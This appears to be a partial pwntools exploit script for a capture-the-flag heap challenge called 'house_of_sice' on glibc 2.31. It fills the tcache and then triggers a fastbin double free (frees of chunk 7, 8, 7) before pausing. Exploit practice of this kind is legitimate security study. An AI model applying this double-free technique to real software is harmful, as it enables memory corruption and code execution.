from pwn import *

#io = process('./house_of_sice', env={"LD_PRELOAD":"./libc-2.31.so"})
io = process('./house_of_sice')

elf = ELF('./libc-2.31.so')

def add(num):
    print(io.recvuntil(b'> '))
    io.sendline(b'1')
    print(io.recvuntil(b'> '))
    io.sendline(b'1')
    print(io.recvuntil(b'> '))
    io.sendline(str(num))

def add_c(num):
    print(io.recvuntil(b'> '))
    io.sendline(b'1')
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recvuntil(b'> '))
    io.sendline(str(num))

def remove(index):
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recvuntil(b'> '))
    io.sendline(str(index))

for i in range(7):
    add(i)


add(10)
add(10)

for i in range(7):
    remove(i)

remove(7)
remove(8)
remove(7)

add(20)
add(20)
add_c(90)
pause()
